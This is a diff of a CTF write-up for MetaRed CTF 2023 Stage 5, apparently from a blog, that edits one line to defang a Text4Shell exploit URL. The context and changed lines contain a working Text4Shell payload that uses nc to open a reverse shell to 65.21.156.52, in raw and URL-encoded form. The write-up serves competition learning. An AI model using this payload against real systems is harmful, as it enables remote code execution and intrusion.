@@ -12,7 +12,7 @@ tags: [web, write-up, ctf]     # TAG names should always be lowercase
 <img src="/assets/writeup/cookie/MetaRed CTF 2023 - Stage 5 e42a378f8c09464288274c527d70a42a/Untitled.png">
 payload: `${java.lang.Runtime.getRuntime().exec('nc 65.21.156.52 4443 -e /bin/bash')}`
 
-payload encode url: [`http://190.15.135.60/text4shell/attack?search=%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('nc 65.21.156.52 4443 -e %2Fbin%2Fbash')}`](http://190.15.135.60/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%2065.21.156.52%204443%20-e%20%2Fbin%2Fbash%27%29%7D) - **encode $ { }/ và ( )**
+payload encode url: xxxx(http)://190.15.135.60/text4shell/attack?search=%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('nc 65.21.156.52 4443 -e %2Fbin%2Fbash')} - **encode $ { }/ và ( )**
 
 <img src="/assets/writeup/cookie/MetaRed CTF 2023 - Stage 5 e42a378f8c09464288274c527d70a42a/Untitled 1.png">
 
